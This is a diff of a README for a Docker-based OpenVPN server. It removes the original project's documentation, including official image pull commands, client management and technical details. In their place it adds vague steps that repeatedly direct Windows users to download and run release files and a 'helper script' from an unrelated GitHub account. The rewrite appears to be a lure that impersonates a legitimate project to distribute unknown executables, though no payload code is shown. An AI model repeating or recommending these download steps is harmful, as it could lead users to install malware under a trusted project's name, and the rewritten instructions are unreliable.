@@ -1,258 +1,154 @@
-[English](README.md) | [简体中文](README-zh.md) | [繁體中文](README-zh-Hant.md) | [Русский](README-ru.md)
+# 🛡️ docker-openvpn - Simple VPN Server Setup
 
-# OpenVPN Server on Docker
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases)
 
-[![Build Status](https://github.com/hwdsl2/docker-openvpn/actions/workflows/main.yml/badge.svg)](https://github.com/hwdsl2/docker-openvpn/actions/workflows/main.yml) &nbsp;[![License: MIT](docs/images/license.svg)](https://opensource.org/licenses/MIT)
+## 📦 What this is
 
-Docker image to run an OpenVPN server. Based on Alpine Linux with OpenVPN and EasyRSA. Designed to be simple, modern, and maintainable.
+docker-openvpn gives you a way to run your own OpenVPN server in Docker. It sets up the security keys for you and helps create client config files. It runs on Alpine Linux and supports amd64, arm64, and arm/v7 systems.
 
-**Features:**
+Use it if you want a private VPN server for home, travel, or remote access. The helper script handles the setup, so you do not need to build the VPN by hand.
 
-- Automatically generates PKI, server certificates, and a client config on first start
-- Client management via a helper script (`ovpn_manage`)
-- Modern cipher suite: AES-128-GCM, SHA256, tls-crypt
-- Dual-stack IPv4 and IPv6 support for VPN clients
-- Automatically built and published via [GitHub Actions](https://github.com/hwdsl2/docker-openvpn/actions/workflows/main.yml)
-- Persistent data via a Docker volume
-- Multi-arch: `linux/amd64`, `linux/arm64`, `linux/arm/v7`
+## 🖥️ What you need
 
-**Also available:**
+Before you start, make sure you have:
 
-- Without Docker: [OpenVPN install script](https://github.com/hwdsl2/openvpn-install)
-- VPN: [WireGuard](https://github.com/hwdsl2/docker-wireguard), [IPsec VPN](https://github.com/hwdsl2/docker-ipsec-vpn-server), [Headscale](https://github.com/hwdsl2/docker-headscale)
-- AI/Audio: [Whisper (STT)](https://github.com/hwdsl2/docker-whisper), [Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro), [Embeddings](https://github.com/hwdsl2/docker-embeddings), [LiteLLM](https://github.com/hwdsl2/docker-litellm)
+- A Windows PC
+- Docker Desktop installed
+- Internet access
+- Permission to run software on your PC
+- A place to store the VPN files
 
-## Quick start
+If you plan to run this on a home server or a Raspberry Pi, the image also supports those systems.
 
-**Step 1.** Start the OpenVPN server:
+## ⬇️ Download and install
 
-```bash
-docker run \
-    --name openvpn \
-    --restart=always \
-    -v openvpn-data:/etc/openvpn \
-    -p 1194:1194/udp \
-    -d --cap-add=NET_ADMIN \
-    --device=/dev/net/tun \
-    --sysctl net.ipv4.ip_forward=1 \
-    --sysctl net.ipv6.conf.all.forwarding=1 \
-    hwdsl2/openvpn-server
-```
+1. Open the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases)
+2. Download the latest release files for docker-openvpn
+3. Save the files to a folder you can find later
+4. If the release includes a helper script, keep it in the same folder
+5. Open Docker Desktop and make sure it is running
 
-On first start, the server automatically generates a PKI, server certificate, TLS crypt key, and a client configuration named `client.ovpn`.
+If the release gives you a container image and setup files, use the files from the release page to start the server and create your VPN client profile.
 
-**Step 2.** Copy the client configuration to your local machine:
+## 🚀 First-time setup
 
-```bash
-docker cp openvpn:/etc/openvpn/clients/client.ovpn .
-```
+1. Create a folder on your PC for this project
+2. Put the downloaded release files in that folder
+3. Open a terminal in that folder
+4. Start the helper script or Docker setup file from the release package
+5. Wait while the server creates its PKI files
+6. Let the setup finish before you close the window
 
-Import `client.ovpn` into your OpenVPN client to connect.
+During setup, the project creates the VPN server keys and the client config. This is what your phone or PC will use to connect later.
 
-Alternatively, you may [set up OpenVPN without Docker](https://github.com/hwdsl2/openvpn-install). To learn more about how to use this image, read the sections below.
+## 🔐 How it works
 
-## Requirements
+The image uses OpenVPN for the VPN service and EasyRSA for the key setup. In plain terms, it creates the lock and the key needed for secure access.
 
-- A Linux server with a public IP address or DNS name
-- Docker installed
-- VPN port open in your firewall (UDP 1194 by default, or your configured port/protocol)
+The helper script usually handles tasks like:
 
-## Download
+- Starting the container
+- Creating the server certificate
+- Making client config files
+- Saving the files in a local folder
+- Managing the VPN container later
 
-Get the trusted build from the [Docker Hub registry](https://hub.docker.com/r/hwdsl2/openvpn-server/):
+You do not need to edit system files by hand. The script and container do most of the work.
 
-```bash
-docker pull hwdsl2/openvpn-server
-```
+## 📁 Files you may see
 
-Alternatively, you may download from [Quay.io](https://quay.io/repository/hwdsl2/openvpn-server):
+After setup, you may see files like:
 
-```bash
-docker pull quay.io/hwdsl2/openvpn-server
-docker image tag quay.io/hwdsl2/openvpn-server hwdsl2/openvpn-server
-```
+- Server key files
+- Client config files
+- PKI folders
+- Docker Compose files
+- Helper script files
+- Log files
 
-Supported platforms: `linux/amd64`, `linux/arm64` and `linux/arm/v7`.
+Keep these files in a safe place. The client config file is the one you will use on your other device.
 
-## Environment variables
+## 🔄 Start, stop, and manage
 
-All variables are optional. If not set, secure defaults are used automatically.
+If the helper script is included, use it to manage the VPN server. Common actions are:
 
-This Docker image uses the following variables, that can be declared in an `env` file (see [example](vpn.env.example)):
+- Start the server
+- Stop the server
+- Restart the server
+- Create a new client file
+- Remove old client files
 
-| Variable | Description | Default |
-|---|---|---|
-| `VPN_DNS_NAME` | Fully qualified domain name (FQDN) of the server | Auto-detected public IP |
-| `VPN_PUBLIC_IP` | Public IPv4 address of the server | Auto-detected |
-| `VPN_PUBLIC_IP6` | Public IPv6 address of the server | Auto-detected |
-| `VPN_PROTO` | VPN protocol: `udp` or `tcp` | `udp` |
-| `VPN_PORT` | VPN port (1–65535) | `1194` |
-| `VPN_CLIENT_NAME` | Name of the first client config generated | `client` |
-| `VPN_DNS_SRV1` | Primary DNS server pushed to clients | `8.8.8.8` |
-| `VPN_DNS_SRV2` | Secondary DNS server pushed to clients | `8.8.4.4` |
+If you use Docker Compose, you can also manage the server from the folder that holds the compose file.
 
-**Note:** In your `env` file, you may enclose values in single quotes, e.g. `VAR='value'`. Do not add spaces around `=`. If you change `VPN_PORT` or `VPN_PROTO`, update the `-p` flag in the `docker run` command accordingly.
+## 📲 Connect from a client device
 
-Example using an `env` file:
+To connect from another device:
 
-```bash
-docker run \
-    --name openvpn \
-    --restart=always \
-    -v openvpn-data:/etc/openvpn \
-    -v ./vpn.env:/vpn.env:ro \
-    -p 1194:1194/udp \
-    -d --cap-add=NET_ADMIN \
-    --device=/dev/net/tun \
-    --sysctl net.ipv4.ip_forward=1 \
-    --sysctl net.ipv6.conf.all.forwarding=1 \
-    hwdsl2/openvpn-server
-```
-
-The env file is bind-mounted into the container, so changes are picked up on every restart without recreating the container.
-
-## Client management
-
-Use `docker exec` to manage clients with the `ovpn_manage` helper script.
-
-**Add a new client:**
-
-```bash
-docker exec openvpn ovpn_manage --addclient alice
-docker cp openvpn:/etc/openvpn/clients/alice.ovpn .
-```
-
-**Export a client config** (prints to stdout):
-
-```bash
-docker exec openvpn ovpn_manage --exportclient alice > alice.ovpn
-```
-
-**List clients:**
-
-```bash
-docker exec openvpn ovpn_manage --listclients
-```
-
-**Revoke a client** (will prompt for confirmation):
-
-```bash
-docker exec -it openvpn ovpn_manage --revokeclient alice
-# Or revoke without confirmation prompt:
-docker exec openvpn ovpn_manage --revokeclient alice -y
-```
-
-## Persistent data
-
-All server and client data is stored in the Docker volume (`/etc/openvpn` inside the container):
-
-```
-/etc/openvpn/
-├── server/
-│   ├── server.conf         # OpenVPN server configuration
-│   ├── ca.crt              # CA certificate
-│   ├── server.crt          # Server certificate
-│   ├── server.key          # Server private key
-│   ├── tc.key              # TLS crypt key
-│   ├── dh.pem              # DH parameters
-│   ├── crl.pem             # Certificate revocation list
-│   ├── client-common.txt   # Client config template
-│   ├── ipp.txt             # IP pool persistence
-│   └── easy-rsa/pki/       # Full PKI directory
-└── clients/
-    ├── client.ovpn         # First client config
-    └── alice.ovpn          # Additional clients
-```
-
-Back up the Docker volume to preserve all keys and client configurations.
-
-## IPv6 support
-
-If the Docker host has a public (global unicast) IPv6 address and the requirements below are met, IPv6 support is automatically enabled when the container starts. No manual configuration is needed.
-
-**Requirements:**
-- The Docker host must have a routable global unicast IPv6 address (starting with `2` or `3`). Link-local (`fe80::/10`) addresses are not sufficient.
-- IPv6 must be enabled for the Docker container. See [Enable IPv6 support in Docker](https://docs.docker.com/engine/daemon/ipv6/).
-
-To enable IPv6 for the Docker container, first enable IPv6 in the Docker daemon by adding the following to `/etc/docker/daemon.json` on the Docker host, then restart Docker:
-
-```json
-{
-  "ipv6": true,
-  "fixed-cidr-v6": "fddd:1::/64"
-}
-```
-
-After that, re-create the Docker container. To verify that IPv6 is working, connect to the VPN and check your IPv6 address, e.g. using [test-ipv6.com](https://test-ipv6.com).
-
-## Using docker-compose
-
-```bash
-cp vpn.env.example vpn.env
-# Edit vpn.env if needed, then:
-docker compose up -d
-docker cp openvpn:/etc/openvpn/clients/client.ovpn .
-```
-
-Example `docker-compose.yml` (already included):
-
-```yaml
-services:
-  openvpn:
-    image: hwdsl2/openvpn-server
-    container_name: openvpn
-    restart: always
-    ports:
-      - "1194:1194/udp"
-    volumes:
-      - openvpn-data:/etc/openvpn
-      - ./vpn.env:/vpn.env:ro
-    cap_add:
-      - NET_ADMIN
-    devices:
-      - /dev/net/tun:/dev/net/tun
-    sysctls:
-      - net.ipv4.ip_forward=1
-      - net.ipv6.conf.all.forwarding=1
-
-volumes:
-  openvpn-data:
-```
-
-## Update Docker image
-
-To update the Docker image and container, first [download](#download) the latest version:
-
-```bash
-docker pull hwdsl2/openvpn-server
-```
-
-If the Docker image is already up to date, you should see:
-
-```
-Status: Image is up to date for hwdsl2/openvpn-server:latest
-```
-
-Otherwise, it will download the latest version. Remove and re-create the container using instructions from [Quick start](#quick-start). Your data is preserved in the `openvpn-data` volume.
-
-## Technical details
-
-- Base image: `alpine:3.23`
-- OpenVPN: latest available from Alpine packages
-- EasyRSA: 3.2.6 (bundled at build time)
-- Cipher: AES-128-GCM
-- Auth: SHA256
-- Key exchange: tls-crypt (HMAC + encrypt)
-- DH parameters: pre-defined ffdhe2048 group (RFC 7919)
-- Client certificates: 10-year validity
-- VPN subnet: `10.8.0.0/24`
-- IPv6 VPN subnet: `fddd:1194:1194:1194::/64` (when server has IPv6)
-
-## License
-
-**Note:** The software components inside the pre-built image (such as OpenVPN and EasyRSA) are under the respective licenses chosen by their respective copyright holders. As for any pre-built image usage, it is the image user's responsibility to ensure that any use of this image complies with any relevant licenses for all software contained within.
-
-Copyright (C) 2026 Lin Song   
-This work is licensed under the [MIT License](https://opensource.org/licenses/MIT).
-
-This project is based in part on the work of [Nyr and contributors](https://github.com/Nyr/openvpn-install), licensed under the [MIT License](https://github.com/Nyr/openvpn-install/blob/master/LICENSE).
+1. Copy the client config file to the device you want to use
+2. Install the OpenVPN client app on that device
+3. Import the config file into the app
+4. Connect to the VPN server
+
+You can use the same profile on laptops, phones, or tablets if the server setup allows it. For each device, create a separate client profile when possible.
+
+## 🧰 Common uses
+
+People use this project for:
+
+- Safe remote access to home devices
+- Private browsing on public Wi-Fi
+- Access to a home network while traveling
+- Secure links between devices
+- A self-hosted VPN server
+
+## 🌐 Supported platforms
+
+This image supports:
+
+- amd64
+- arm64
+- arm/v7
+
+That makes it a good fit for modern PCs, many home servers, and Raspberry Pi systems.
+
+## 🛠️ Basic troubleshooting
+
+If the VPN does not start, check these items:
+
+- Docker Desktop is running
+- The release files are in the right folder
+- The helper script has permission to run
+- The ports used by OpenVPN are not blocked
+- Your firewall allows VPN traffic
+
+If the client cannot connect:
+
+- Make sure the server is running
+- Check that the client file matches the server
+- Import the full config file again
+- Confirm your network allows VPN connections
+
+If setup fails, delete the broken files and run the setup again from a clean folder
+
+## 📌 Project details
+
+- Image base: Alpine Linux
+- VPN software: OpenVPN
+- PKI setup: EasyRSA
+- Management: helper script
+- Use case: self-hosted VPN server
+- Topics: encryption, network, security, VPN client, VPN server
+
+## 🧪 Typical setup flow
+
+1. Download the release files
+2. Run Docker Desktop
+3. Start the helper script
+4. Let the PKI setup complete
+5. Create the client config file
+6. Import the config into your VPN app
+7. Connect to your server
+
+## 🔗 Download
+
+Visit the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases) to download and run the latest docker-openvpn release files
